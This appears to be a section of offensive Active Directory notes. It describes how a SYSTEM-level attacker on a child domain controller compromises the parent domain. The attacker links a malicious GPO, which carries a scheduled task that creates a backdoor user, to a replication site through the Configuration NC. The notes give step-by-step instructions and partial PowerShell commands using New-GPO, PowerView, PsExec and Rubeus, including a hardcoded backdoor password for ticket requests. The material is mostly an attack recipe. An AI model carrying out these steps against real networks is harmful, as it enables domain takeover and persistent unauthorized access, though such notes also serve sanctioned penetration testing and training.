# 14.09 GPO On Site Attack Child→Parent via Config NC

> As SYSTEM on a child DC, create a malicious GPO + scheduled task and link it to a parent-domain site via the replicated Configuration NC.

## Overview

As SYSTEM on a child DC, create a malicious GPO in the child domain containing a scheduled task that adds a backdoor user, then link it to the Default-First-Site-Name replication site using the child domain as the server. The Configuration NC replicates the site link to the parent domain, executing the scheduled task on the parent DC.

## Steps

- Create GPO in child domain with **New-GPO**
- Add an immediate scheduled task with **New-GPOImmediateTask** from PowerSploit's older PowerView
- Retrieve the parent DC's replication site DN with **Get-ADDomainController -Server <DOMAIN>.ad**
- Run PsExec to get a SYSTEM shell, then link GPO to the site with **New-GPLink -Server dev.<DOMAIN>.ad**
- Wait for replication; backdoor user will be created on parent DC
- Use **Rubeus asktgt** with the backdoor user credentials to authenticate to the parent domain

## Commands

### Create GPO

```powershell
PS C:\Tools> $gpo = "Backdoor"
```

### Add scheduled task to GPO

```powershell
PS C:\Tools> Import-Module .\PowerView_2.ps1
```

### Get replication site

```powershell
PS C:\Tools> Get-ADDomainController -Server <DOMAIN>.ad |Select ServerObjectDN
```

### Link GPO as SYSTEM

```powershell
PS C:\Tools> .\PsExec.exe -s -i powershell.exe
```

### Request TGT for backdoor user

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:<DOMAIN>.ad /ptt
```
